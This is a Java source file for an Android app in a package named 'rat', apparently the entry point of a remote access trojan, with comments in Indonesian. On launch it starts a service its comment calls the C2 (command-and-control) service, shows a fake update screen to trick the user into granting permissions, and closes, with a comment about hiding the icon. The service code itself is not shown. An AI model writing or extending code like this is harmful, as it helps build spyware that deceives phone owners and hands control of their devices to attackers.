package com.enterprise.rat;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;
import com.enterprise.rat.activities.FakeUpdateActivity;
import com.enterprise.rat.services.MainService;

public class LauncherActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Mulai layanan C2
        Intent serviceIntent = new Intent(this, MainService.class);
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Tampilkan layar izin
        Intent fakeUpdate = new Intent(this, FakeUpdateActivity.class);
        startActivity(fakeUpdate);
        
        // Sembunyikan ikon asli dan tutup
        // (Ikon LauncherActivity akan tetap ada di peluncur)
        finish();
    }
}
